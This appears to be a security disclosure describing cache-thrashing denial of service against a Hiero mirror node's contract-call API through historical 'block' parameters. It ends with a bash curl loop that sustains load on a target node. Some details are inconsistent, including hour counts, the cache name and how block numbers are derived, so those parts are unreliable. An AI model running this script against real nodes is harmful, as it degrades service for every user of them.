### Title
Historical Block Requests Cause Exchange Rate Cache Thrashing via Unbounded Timestamp Key Space

### Summary
The `exchangeRate` Caffeine cache (`cacheManagerSystemFileExchangeRates`) is configured with `maximumSize=20` and uses a composite `CacheKey(fileId, roundedHourTimestamp)`. Because the Web3 API supports historical contract calls via the `block` parameter, an unprivileged attacker can send requests targeting 7+ distinct historical hours across the 3 file IDs that share this cache, generating 21+ distinct keys, continuously evicting entries, and forcing a DB read on every exchange rate lookup.

### Finding Description

`ContractCallContext.java` lines 103–116 — historical mode enabled by `block != LATEST`:
```java

    return callServiceParameters != null && callServiceParameters.getBlock() != BlockType.LATEST;
}
```

**Root cause:** The cache key space is `{exchangeRateFileId, feeSchedulesFileId, simpleFeeSchedulesFileId} × {any historical hour}`. With `maximumSize=20`, only ~6–7 distinct hours can be held simultaneously (3 file IDs × 7 hours = 21 entries). The `roundDownToHour` mitigation reduces intra-hour collisions but does not bound the number of distinct hours an attacker can target. There is no restriction on which historical block a caller may specify.

**Exploit flow:**
1. Attacker sends 21 `POST /api/v1/contracts/call` requests, each with `"block": "<block-number-in-hour-N>"` for N = 1…7 (three file IDs × 7 hours = 21 distinct keys).
2. Each request triggers `MidnightRatesSingleton.get()` → `SystemFileLoader.load()` → cache miss → `fileDataRepository.getFileAtTimestamp()` DB query.
3. After 20 entries the cache is full; the 21st request evicts an entry.
4. Attacker cycles through the same 21+ hour-buckets in a round-robin pattern. Every request is a cache miss, every request hits the DB.
5. At the default 500 RPS throttle, this sustains 500 DB queries/second for exchange rate data that would otherwise be served entirely from cache.

**Why existing checks fail:**
- The global rate limiter (`requestsPerSecond=500`, `gasPerSecond`) throttles total throughput but does not distinguish cache-thrashing historical requests from normal ones.
- The `roundDownToHour` granularity reduction is insufficient: it only collapses sub-hour variance; it does nothing to limit the number of distinct hours an attacker can enumerate.
- No per-IP, per-user, or per-block-range rate limiting exists.
- The cache has no protection against deliberate key-space exhaustion.

### Impact Explanation
Under normal operation the `fee` cache serves nearly all exchange rate lookups from memory (current-hour key, 3 entries). Under this attack, every single contract call — including legitimate ones — incurs a `file_data` table query for exchange rate data. The `file_data` query (`getFileAtTimestamp`) is a timestamp-range scan on a large append-only table. Sustained at 500 RPS this represents a qualitative shift from ~0 to ~500 additional DB queries/second for this data path alone, well exceeding the 30% resource consumption threshold on the database tier. Because the `fee` cache is shared across all concurrent requests (it is a singleton Spring bean), the degradation is global, not per-attacker.

### Likelihood Explanation
The attack requires no authentication, no on-chain funds, and no special knowledge beyond the public JSON-RPC API. The `block` parameter is documented and widely used. Cycling through 21 historical block numbers is trivially scriptable. The attacker stays within the default 500 RPS limit, so no throttle exception is raised. The attack is fully repeatable and can be sustained indefinitely.

### Recommendation
1. **Increase `maximumSize`**: Raise `hiero.mirror.web3.cache.fee` `maximumSize` to at least 1000 to absorb realistic historical query distributions without eviction.
2. **Bound historical block range**: Reject or separately throttle contract calls targeting blocks older than a configurable window (e.g., 24 hours) to limit the effective key space.
3. **Per-IP or per-session rate limiting on historical calls**: Apply a stricter sub-limit to requests with `block != latest`.
4. **Cache stampede protection**: Use Caffeine's `AsyncLoadingCache` or a `computeIfAbsent`-style loader to prevent concurrent DB reads for the same missing key.

### Proof of Concept
```bash
# Generate 21 distinct hour-bucket requests (hours 1..7, 3 file IDs each triggered per call)
for HOUR in $(seq 1 21); do
  # Each block number maps to a different hour in the past
  BLOCK_HEX=$(printf '0x%x' $((1000000 + HOUR * 3600)))
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d "{\"to\":\"0x0000000000000000000000000000000000000167\",
         \"data\":\"0x\",
         \"gas\":50000,
         \"block\":\"$BLOCK_HEX\"}" &
done
wait

# Now cycle through the same 21 blocks continuously at ~500 RPS
# Every request is a cache miss; DB query rate for file_data spikes from ~0 to ~500/s
while true; do
  for HOUR in $(seq 1 21); do
    BLOCK_HEX=$(printf '0x%x' $((1000000 + HOUR * 3600)))
    curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
      -H 'Content-Type: application/json' \
      -d "{\"to\":\"0x0000000000000000000000000000000000000167\",
           \"data\":\"0x\",
           \"gas\":50000,
           \"block\":\"$BLOCK_HEX\"}" &
  done
  sleep 0.05  # ~420 RPS, within the 500 RPS limit
done
```
